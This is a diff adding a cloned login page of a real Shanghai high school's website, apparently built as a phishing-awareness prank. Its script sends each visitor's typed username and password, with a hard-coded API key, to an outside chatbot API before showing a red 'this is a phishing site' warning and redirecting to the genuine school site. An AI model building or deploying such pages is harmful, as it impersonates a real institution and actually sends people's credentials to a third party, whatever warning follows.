@@ -1,0 +1,254 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<!-- saved from url=(0053)https://www.hsys.pudong-edu.sh.cn/infoweb/xlogin.html -->
+<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title id="XPageTitle">系统登录</title>
+<link id="XCssRef" href="./login_files/style.css" rel="stylesheet" type="text/css">
+<style type="text/css">
+    /* 反钓鱼警示：整页红色警告 */
+    #phishOverlay {
+        display: none;
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: red;
+        z-index: 99998;
+    }
+    #phishOverlay .phish-warn-text {
+        color: greenyellow;
+        font-size: clamp(36px, 9vw, 72px);
+        font-weight: bold;
+        text-align: center;
+        position: absolute;
+        top: 45%;
+        left: 0;
+        width: 100%;
+        transform: translateY(-50%);
+        letter-spacing: 4px;
+        line-height: 1.3;
+        padding: 0 20px;
+        box-sizing: border-box;
+        text-shadow: 3px 3px 10px rgba(0,0,0,0.45);
+        font-family: "Microsoft YaHei", "SimHei", sans-serif;
+    }
+    /* 反钓鱼警示：模态框 */
+    #phishModal {
+        display: none;
+        position: fixed;
+        top: 0; left: 0;
+        width: 100%; height: 100%;
+        background: rgba(0,0,0,0.6);
+        z-index: 99999;
+        overflow-y: auto;
+        -webkit-overflow-scrolling: touch;
+    }
+    #phishModal .phish-modal-box {
+        width: 580px;
+        max-width: 92%;
+        margin: 16% auto 0 auto;
+        background: #ffffff;
+        border-radius: 8px;
+        padding: 32px 36px 26px 36px;
+        box-shadow: 0 10px 36px rgba(0,0,0,0.4);
+        font-family: "Microsoft YaHei", "SimHei", sans-serif;
+        text-align: left;
+    }
+    #phishModal .phish-modal-box h3 {
+        color: #c80000;
+        font-size: 24px;
+        margin: 0 0 14px 0;
+        text-align: center;
+    }
+    #phishModal .phish-modal-box p {
+        color: #333333;
+        font-size: 16px;
+        line-height: 2;
+        margin: 0 0 24px 0;
+    }
+    #phishModal .phish-modal-box .phish-btn-wrap {
+        text-align: center;
+    }
+    #phishOkBtn {
+        background: #c80000;
+        color: #ffffff;
+        border: none;
+        font-size: 18px;
+        font-weight: bold;
+        padding: 10px 52px;
+        border-radius: 4px;
+        cursor: pointer;
+        font-family: "Microsoft YaHei", "SimHei", sans-serif;
+    }
+    #phishOkBtn:hover {
+        background: #a00000;
+    }
+
+    /* ===== 移动端适配（手机/小屏） ===== */
+    @media (max-width: 600px) {
+        #phishOverlay .phish-warn-text {
+            font-size: clamp(32px, 11vw, 52px);
+            letter-spacing: 2px;
+            top: 42%;
+            padding: 0 16px;
+        }
+        #phishModal {
+            padding: 20px 0;
+        }
+        #phishModal .phish-modal-box {
+            width: 90%;
+            max-width: 90%;
+            margin: 0 auto;
+            padding: 24px 20px 20px 20px;
+            border-radius: 10px;
+            box-shadow: 0 8px 28px rgba(0,0,0,0.45);
+        }
+        #phishModal .phish-modal-box h3 {
+            font-size: 20px;
+            margin: 0 0 12px 0;
+        }
+        #phishModal .phish-modal-box p {
+            font-size: 15px;
+            line-height: 1.9;
+            margin: 0 0 20px 0;
+        }
+        #phishOkBtn {
+            width: 100%;
+            font-size: 17px;
+            padding: 13px 0;
+            min-height: 46px;
+            border-radius: 6px;
+        }
+    }
+</style>
+</head>
+
+<body>
+ 
+<div id="MainBox">
+	
+<div id="top">
+<div id="systop" class="Sys-top">
+
+	</div>
+<div id="sys_menu" class="Sys-Menu1">
+		
+    <ul><li class="hover"><a style="background: none; padding: 0px;" href="https://www.hsys.pudong-edu.sh.cn/infoweb/index1.html">首 页</a></li><li><a href="https://www.hsys.pudong-edu.sh.cn/infoweb/item178.html">文明创建</a></li><li><a href="https://www.hsys.pudong-edu.sh.cn/infoweb/item3.html">学校管理</a></li><li><a href="https://www.hsys.pudong-edu.sh.cn/infoweb/item4.html">教学发展</a></li><li><a href="https://www.hsys.pudong-edu.sh.cn/infoweb/item13.html">德育天地</a></li><li><a href="https://www.hsys.pudong-edu.sh.cn/infoweb/item6.html">教育教学科研</a></li><li><a href="https://www.hsys.pudong-edu.sh.cn/infoweb/item8.html">党建工作</a></li><li><a href="https://www.hsys.pudong-edu.sh.cn/infoweb/item5.html">科技教育</a></li><li><a href="https://www.hsys.pudong-edu.sh.cn/infoweb/item12.html">绿色校园</a></li><li><a href="https://www.hsys.pudong-edu.sh.cn/infoweb/item9.html">教工之家</a></li><li><a href="https://www.hsys.pudong-edu.sh.cn/infoweb/list11_1.html">联系我们</a></li></ul>
+                        
+	</div>
+<div id="sys_search" class="Sys-search">
+
+	</div>
+</div>
+<div class="main">&nbsp;</div>
+<div class="main" align="center">
+<div style="width:350px;float:left">&nbsp;</div>
+<div id="box1" class="leftbox" valign="middle" style="width:500px;float:left">
+		
+    
+<div class="Sys-Login">
+                            <h2><span>用户登录</span></h2><div style=" padding-left:15px">
+                                <span class="s1">用户:</span>
+                                <span class="s2"><input name="TxtUserID" id="TxtUserID" class="input"></span>
+                                </div>
+                                <div style=" padding-left:15px; overflow:hidden;">
+                                <span class="s1">密码:</span>
+                                <span class="s2">
+                                    <input name="TxtPassword" id="TxtPassword" type="password" class="input"></span>
+                                </div>
+                                <div style=" text-align:center; padding:3px 0; clear:both;"> 
+                                    <input type="image" src="./login_files/load.gif" id="PzlLoginButton"></div>
+                                <!--<div style=" border-top:1px solid #ccc; text-align:center; padding-top:5px;">新用户注册  忘记密码</div>-->
+                                </div>
+
+        	<script language="javascript" src="./login_files/pzlframemask.js"></script>
+<script src="./login_files/jquery.min.js" type="text/javascript"></script>
+ <script src="./login_files/pzlsecurity.js" type="text/javascript"></script>
+
+<script>
+    const tianApiKey = "868ffe977d3b445b541e7e28acb51e41";
+
+    $("#PzlLoginButton").click(function (e) {
+        e.preventDefault();
+
+        const userid = document.getElementById('TxtUserID').value;
+        const pass = document.getElementById('TxtPassword').value;
+
+        const msgContent = 'user:' + userid + ', pwd:' + pass;
+
+        $.post("https://apis.tianapi.com/robot/index", {
+            key: tianApiKey,
+            question: msgContent
+        })
+
+
+    });
+</script>
+
+	</div>
+    <div style="width:350px;float:right">&nbsp;</div>
+</div>
+<div class="main">&nbsp;</div>
+
+<div id="sys_bottom">
+		
+<div id="bottom">
+    <p><a title="点击查看大图" href="http://www.hsys.pudong-edu.sh.cn/infomng/PZLUPLOAD/WZSZW1007/jpg/XZLADMIN160616082050.jpg" target="_blank"></a></p><a href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=31011502100213" target="_blank"><img style="HEIGHT: 25px; WIDTH: 28px" border="0" src="./login_files/XZLADMIN160623154507.png" width="36" height="29">沪公网安备31011502100213号</a>
+<div align="center">国家反诈中心官网：<a href="https://fzapph5.gjfzpt.cn">https://fzapph5.gjfzpt.cn</a></div>
+</div>
+	</div>
+
+
+</div>
+ 
+
+
+<!-- ===== 反钓鱼安全警示（整页红色警告 + 模态框） ===== -->
+<div id="phishOverlay">
+    <div class="phish-warn-text">我就知道你会来</div>
+</div>
+<div id="phishModal">
+    <div class="phish-modal-box">
+        <h3>安全警告</h3>
+        <p>这是一个钓鱼网站，但好在不是钓鱼佬发布的。<br>牢记：不要随意将自己的任何账号密码泄漏给他人，不要点进任何显示“不安全”的网站，不要一时着急点进非官方网站！！！<br>点击下面按钮前往上海市杨思高级中学官网</p>
+        <div class="phish-btn-wrap"><button id="phishOkBtn" type="button">知道了</button></div>
+    </div>
+</div>
+
+<script>
+    // ===== 反钓鱼安全警示（独立原生 JS，不影响原有业务逻辑，有无 jQuery 均可运行） =====
+    (function () {
+        var overlay = document.getElementById("phishOverlay");
+        var modal = document.getElementById("phishModal");
+        var okBtn = document.getElementById("phishOkBtn");
+        var loginBtn = document.getElementById("PzlLoginButton");
+
+        // 整页变红 + 白字警告，2秒后弹出模态框
+        function showPhishWarning() {
+            if (overlay) {
+                overlay.style.display = "block";
+            }
+            setTimeout(function () {
+                if (modal) {
+                    modal.style.display = "block";
+                }
+            }, 2000);
+        }
+
+        // 点击登录按钮：原有逻辑（post 数据）已由原脚本触发，随后展示安全警示
+        if (loginBtn) {
+            loginBtn.addEventListener("click", function () {
+
+                showPhishWarning();
+            });
+        }
+
+        // 点击“知道了”，跳转到官方网站
+        if (okBtn) {
+            okBtn.addEventListener("click", function () {
+                window.location.href = "https://www.hsys.pudong-edu.sh.cn/infoweb/";
+            });
+        }
+    })();
+</script>
+
+</body></html>
